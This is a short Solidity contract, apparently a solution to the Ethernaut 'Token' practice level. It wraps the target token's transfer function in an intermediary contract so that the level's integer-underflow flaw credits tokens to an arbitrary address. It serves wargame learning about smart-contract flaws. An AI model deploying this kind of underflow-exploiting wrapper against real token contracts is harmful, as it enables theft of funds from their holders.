// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Token.sol";

contract TokenAttacker {

    //Dont forget to replace the address below with the address that you will have from ethernaut
    Token public mainContract = Token(0xDE3B5801C31c4CbB6d285FfcBa95Ac13D2A286C8);

    function transferAttacker(address _to, uint _value) public {
        mainContract.transfer(_to, _value);
    }

}